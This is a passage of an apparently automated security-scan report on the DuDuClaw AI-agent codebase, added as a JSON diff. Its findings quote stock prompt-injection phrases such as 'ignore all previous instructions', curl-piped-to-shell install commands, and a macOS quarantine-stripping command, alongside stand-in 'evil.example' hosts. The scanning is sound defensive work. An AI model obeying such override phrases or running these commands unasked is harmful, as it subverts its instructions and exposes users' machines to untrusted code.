+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp/group_history.rs",
+      "line": 226,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "7c4ed6a2c05fa16b8952da274a4d396e5feee0cd53424489160ed314c8e51c32"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp/odoo_pool_dispatch_tests.rs",
+      "line": 14,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "945e345f5028debc3838a1120edaf5bf7ab1973f8a3043c943b81b61d295fa04"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp/wp5_install_approval_tests.rs",
+      "line": 458,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "296f881a2e1c13fe39ef00ded085c2ea98b87b9648e9ed6c822a2a497136d8a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp/wiki_namespace_tests/part3.rs",
+      "line": 316,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "fdf7c166a6f19367cac38ae3e7819955a67dc65b0763ab6dcc106eb0086be144"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp/mail_tool_tests.rs",
+      "line": 223,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "a111ff56e656d5bdd2bfeca149ff4871ea63ae0bde249ecc77190cd34b4e762a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/eval/judge.rs",
+      "line": 146,
+      "evidence": "ignore previous rules",
+      "file_sha256": "32019e229229f825690cb9d933cf96193d05363048dc1d67bf63648455863bf5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp_memory_handlers.rs",
+      "line": 2289,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "ace12ffc19b90671c30860610dc0e565bbd9153cfbb87a96b7c0d5b36fabf720"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/migrate_from/claude_code.rs",
+      "line": 925,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "4680cddc615839ead34ce08f8e24dd6a4e4a86a28cf1096917ce82fbf4f8633e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/migrate_from/tests.rs",
+      "line": 187,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "0efdf20cace4b858ffb5cfb1bb2316348b127a500f19d7526b4f2241cb69ac96"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/tests/privacy_regression_perception_neutralize.rs",
+      "line": 55,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "9bb4e01cd8827184f977c611f9368d15f7c40c64846889f65a84d692fc9cbd11"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-security/src/perception.rs",
+      "line": 7,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d1fa98324edd6d3009e6864c975cc53ffef4b914070474a78511f01068426e60"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-security/src/input_guard.rs",
+      "line": 41,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "eaa28acf8da8e8324e763ff91010639525745738cfceb29b5bc8cc23e2ef0f34"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-security/src/soul_scanner.rs",
+      "line": 445,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "a0f9d1be0a537f87d2d622f6363317ed97a38b5b9c5b2d19a6843fd2b7f6c4fb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-security/src/group_context.rs",
+      "line": 70,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "21ab50e8f2a043e9860a8530efd3e1a1b6cbcb327fb6c9df67f3c5d2b3f35771"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-core/src/lib.rs",
+      "line": 1121,
+      "evidence": "curl -fsSL https://x.ai/cli/install.sh | bash",
+      "file_sha256": "44c88c85265536a4203a721dc30a4f1a8a8fd7b8b5fd266e6d914cb1c4a696b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-core/src/tool_error_reason.rs",
+      "line": 375,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "1e31a262af3cc5627458b77df7588ed4bbf1cd54e62bdffdd0b5b9e64a246a84"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-core/src/runtime_catalog.rs",
+      "line": 110,
+      "evidence": "curl -fsSL <url> | bash",
+      "file_sha256": "d0877cd75001b74e26ca509c187f05225a5efb78bd79116cf4dbd25f8346b62d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-core/src/org_field_guard/bash_egress.rs",
+      "line": 136,
+      "evidence": "curl https://example.test' | sh",
+      "file_sha256": "53feafb8f7fdd842cbf620d545fb6ad50d9aa3d72e99017cc4e6893b29da2844"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/templates/redteam/starter-bank.jsonl",
+      "line": 13,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "80f71f1d02f2b39115d5f924ca2b0b320907d1676e7dbe2cacfa81a7ae22cc7b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/Dockerfile",
+      "line": 11,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash",
+      "file_sha256": "ea29b4c26ed2c2d043a5f9e7b648c9632b035062b86893abd66d8a0442deb2ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/container/Dockerfile.server",
+      "line": 82,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash",
+      "file_sha256": "b482423adcbffd3c06da01dec7aadbd07c3bf199b49eb8f8fb8ed1288e1599c7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/scripts/install.sh",
+      "line": 3,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "344431ec40fe94e2fc03110b216b2e2263e4c3bd753aba4e5f6c0f4c37ced4e0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/scripts/box-setup/setup-macos.sh",
+      "line": 91,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "c74307daa83abadbfc67a057547da403c50fc9be24da7868306eac3101a7d576"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0005",
+      "summary": "Runs code downloaded at run time (curl/wget piped or substituted into an interpreter)",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/scripts/box-setup/setup-macos.sh",
+      "line": 91,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y",
+      "file_sha256": "c74307daa83abadbfc67a057547da403c50fc9be24da7868306eac3101a7d576"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/desktop-unblock.md",
+      "line": 25,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "6118005874e35a2798fb5bb2161c9526511e1c4e91ea8006662e0f353a87a343"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/desktop-unblock.md",
+      "line": 59,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "6118005874e35a2798fb5bb2161c9526511e1c4e91ea8006662e0f353a87a343"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/ja-JP/desktop-unblock.md",
+      "line": 25,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "ea9095ec546085293f4dac204a308f8d7dc10fd1f6c08e3c146746ff998ecda9"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/ja-JP/desktop-unblock.md",
+      "line": 59,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "ea9095ec546085293f4dac204a308f8d7dc10fd1f6c08e3c146746ff998ecda9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/ja-JP/development-guide.md",
+      "line": 292,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "11aa8f0e07a7fcaac7887159e00878f9c1fd274d2850364ea2ea5a4acf5f93d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/ja-JP/deployment-guide.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "adbe3468bb39644ab3c9b64e97df1ad1204fd18eea8ed402c854fed7ee9170dc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/ja-JP/macos-folder-access.md",
+      "line": 107,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "5a81437a8bfd74863276f30d35c7c6f99e3dfd6d2aae3f0a52ad98e40c4c69f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/zh-TW/desktop-unblock.md",
+      "line": 25,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "438190cfdc430d4b9ef3739c2a8034d5dc8b0b494a74ef77fc87f57f0b2ebf0f"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/zh-TW/desktop-unblock.md",
+      "line": 59,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "438190cfdc430d4b9ef3739c2a8034d5dc8b0b494a74ef77fc87f57f0b2ebf0f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/zh-TW/development-guide.md",
+      "line": 280,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "606ac76cd83fbd4af3bd6eea41a5469f5ab6c105235f5d5666b5b3d14305cf66"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/zh-TW/deployment-guide.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "56d4c360bca41870be2ef343762d96bcc6cacae77c391ed2517f816f600c4c9e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/zh-TW/macos-folder-access.md",
+      "line": 102,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "411ec648e00c0e757a571ef1539dbd01816ea51c5b9ff21c9390c7c5844eba19"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/development-guide.md",
+      "line": 300,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2e894774867b920d6c9e9496d3f755c1371b0243dbb8b385428d6ca60244850b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/deployment-guide.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "403db3056e92ded6db242354544243ef288341033bda30a49a18015c90c41827"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/guides/macos-folder-access.md",
+      "line": 161,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/zhixuli0406/DuDuClaw/main/scripts/i",
+      "file_sha256": "24a0d428a7364ae62a6865f0823415d121b497652035ae35382fc71e8554d82a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/features/47-agent-mail.md",
+      "line": 170,
+      "evidence": "ignore prior rules",
+      "file_sha256": "6523e4b0b6546d82733a0301ff82a8f38820ef56c80c268f54116638345827b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/docs/features/09-behavioral-contracts.md",
+      "line": 219,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "4614243fb5adf1c05377016ce78d50f477fd2789974a2202b8f15b3cdff7e080"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/src-tauri/vendor/tauri-plugin-updater/permissions/schemas/schema.json",
+      "line": 334,
+      "evidence": "p=0.93 Enables the install command without any pre-configured scope.",
+      "file_sha256": "c60f60c191d706ce29deb42ded0d8d1774147e032f9ae18752ca600ba2392640"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "127.0.0.1.evil.example, 127.255.255.255, 127.42.3.4, 128.0.0.1, 192.168.1.20, dashboard.local, example.invalid, jedisct1.github.io, localhost.evil.example",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "127.0.0.1.evil.example",
+    "127.255.255.255",
+    "127.42.3.4",
+    "128.0.0.1",
+    "192.168.1.10",
+    "192.168.1.20",
+    "192.168.168.244",
+    "accounts.google.com",
+    "accounts.x.ai",
+    "admin.google.com",
+    "aistudio.google.com",
+    "antigravity.google",
+    "api.anthropic.com",
+    "api.duduclaw.dudustudio.monster",
+    "api.example.com",
+    "api.notion.com",
+    "api.openai.com",
+    "api.together.ai",
+    "apis.google.com",
+    "app.infisical.com",
+    "arbitrary.example",
+    "arxiv.org",
+    "auth.example.com",
+    "blog.rust-lang.org",
+    "chat.example",
+    "claude.ai",
+    "claude.com",
+    "code.claude.com",
+    "console.anthropic.com",
+    "console.cloud.google.com",
+    "console.cloud.google.com.evil.example",
+    "console.groq.com",
+    "console.mistral.ai",
+    "console.x.ai",
+    "crates.io",
+    "dash.example.com",
+    "dashboard.example",
+    "dashboard.invalid",
+    "dashboard.local",
+    "dashscope-intl.console.aliyun.com",
+    "demo.duduclaw.app",
+    "developers.google.com",
+    "developers.openai.com",
+    "discord.com",
+    "docs.anthropic.com",
+    "docs.x.ai",
+    "duduclaw.app",
+    "duduclaw.dudustudio.monster",
+    "evil.example",
+    "evil.test",
+    "example.com",
+    "example.invalid",
+    "example.test",
+    "geminicli.com",
+    "github.com",
+    "glama.ai",
+    "gw.example.com",
+    "help.openai.com",
+    "huggingface.co",
+    "img.shields.io",
+    "issuer.example.test",
+    "jedisct1.github.io",
+    "json-schema.org",
+    "line.me",
+    "localhost.evil.com",
+    "localhost.evil.example",
+    "login.example.com",
+    "mcp.zapier.com",
+    "nodejs.org",
+    "oauth2.googleapis.com",
+    "op.internal",
+    "openai.com",
+    "openrouter.ai",
+    "os.duduclaw.dudustudio.monster",
+    "other.example",
+    "outside.test",
+    "platform.deepseek.com",
+    "platform.minimax.io",
+    "platform.openai.com",
+    "public.example",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "registry.modelcontextprotocol.io",
+    "registry.npmjs.org",
+    "rustup.rs",
+    "script.google.com",
+    "shell.cloud.google.com",
+    "static.modelcontextprotocol.io",
+    "t.me",
+    "www.futurecorp.tw",
+    "www.googleapis.com",
+    "www.npmjs.com",
+    "www.w3.org",
+    "x.ai",
+    "x.com",
+    "x.example",
+    "x.test",
+    "y.test",
+    "zhixuli0406.github.io"
+  ],
+  "install_script": false,
+  "score": "high"
+}
